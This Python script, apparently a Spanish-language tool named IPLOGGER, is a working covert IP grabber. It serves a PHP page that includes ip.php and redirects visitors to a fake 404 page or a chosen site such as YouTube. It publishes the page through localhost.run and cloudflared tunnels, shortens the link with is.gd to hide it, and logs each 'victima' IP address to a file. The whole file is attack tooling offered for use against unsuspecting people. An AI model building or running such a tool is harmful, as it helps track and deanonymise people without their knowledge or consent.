#!/usr/bin/python3

import os
import time
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT
import pyshorteners

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

lh_file = "logs/lh.log"
cf_file = "logs/cf.log"
cf_log = open(cf_file, 'w')
lh_log = open(lh_file, 'w')

if os.path.isfile('server/cloudflared'):
   pass
else:
  print('\n\033[31m[!] Cloudflare no esta instalado.')
  print('\n\033[35m[~] Instalando cloudflare...')
  os.system("bash modules/install.sh")

logo = """\033[33m
  _____ _____  _      ____   _____  _____ ______ _____  
 |_   _|  __ \| |    / __ \ / ____|/ ____|  ____|  __ \ 
   | | | |__) | |   | |  | | |  __| |  __| |__  | |__) |
   | | |  ___/| |   | |  | | | |_ | | |_ |  __| |  _  / 
  _| |_| |    | |___| |__| | |__| | |__| | |____| | \ \ 
 |_____|_|    |______\____/ \_____|\_____|______|_|  \_\\

                  By: Euronymou5
"""

def check():
    while True:
        if os.path.isfile('ip.txt'):
          print(' ')
          print('\n\033[94m[~] IP de la victima encontrado!')
          with open('ip.txt') as ip:
            lines = ip.read().rstrip()
            if len(lines) != 0:
                print(' ')
                os.system("cat ip.txt")
                os.system("cat ip.txt >> ip_guardadas.txt")
                print('\n\033[32m[~] IP guardados en: ip_guardadas.txt')
                os.remove("ip.txt")
          ip.close()

def server():
    os.system("clear")
    print(logo)
    print('[~] Iniciando servidor php...')
    var1 = input('\n[~] ¿Quieres utilizar la pagina por default? (Error 404 HTML) [Y/n]: ')
    if var1 == "y" or var1 == "Y":
      file = open('index.php', 'r+')
      ler = file.read()
      file.close()
      if "index.html" in ler:
        pass
      else:
        global file2
        os.remove('index.php')
        file2 = open('index.php', 'w')
        file2.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""")
        file2.close()
      print('\n[~] Utilizando el puerto: 8080')
      print('\n[~] Creando link...')
      time.sleep(2)
      os.system("php -S localhost:8080 > /dev/null 2>&1 &")
      bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)
      ola = False
      for i in range(10):
         lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
         if lhr_url != "":
              ola = True
              break
         time.sleep(1)
      bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
      cf_success = False
      for i in range(10):
          cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
          if cf_url != "":
              cf_success = True
              break
          time.sleep(1)
      print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
      print(f'\n\033[32m[~] Cloudflared: {cf_url}')
      with open('short.txt', 'w') as shorturl:
          s = pyshorteners.Shortener()
          ey = s.isgd.short(cf_url)
          shorturl.write(ey)
      print(f'\n\033[34m[~] Link acortado: {ey}')
      os.remove('short.txt')
      print('\n\033[33m[~] Esperando datos...')
      check()
    elif var1 == "n" or var1 == "N":
      link = input('\n[~] Ingresa el link para redirigir a la victima (e.j: https://youtube.com): ')      
      file = open('index.php', 'w')
      file.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""".replace("index.html", link))
      file.close()     
      print('\n[~] Utilizando el puerto: 8080')
      print('\n[~] Creando link...')
      os.system("php -S localhost:8080 > /dev/null 2>&1 &")
      bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)
      ola = False
      for i in range(10):
         lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
         if lhr_url != "":
              ola = True
              break
         time.sleep(1)
      bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
      cf_success = False
      for i in range(10):
          cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
          if cf_url != "":
              cf_success = True
              break
          time.sleep(1)
      print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
      print(f'\n\033[32m[~] Cloudflared: {cf_url}')
      with open('short.txt', 'w') as shorturl:
          s = pyshorteners.Shortener()
          ey = s.isgd.short(cf_url)
          shorturl.write(ey)
      print(f'\n\033[34m[~] Link acortado: {ey}')
      os.remove('short.txt')
      print('\n[~] Esperando datos...')
      check()

def menu():
    os.system("killall php")
    os.system("clear")
    print(logo)
    print('\n[1] Iniciar servidor php')
    print('[99] Salir')
    T = int(input('\n>> '))
    if  T == 1:
        server()
    elif T == 99:
        exit()
    else:
        print('\n\033[31m[!] Error opcion invalida.')
        time.sleep(2)
        menu()
        
        
menu()
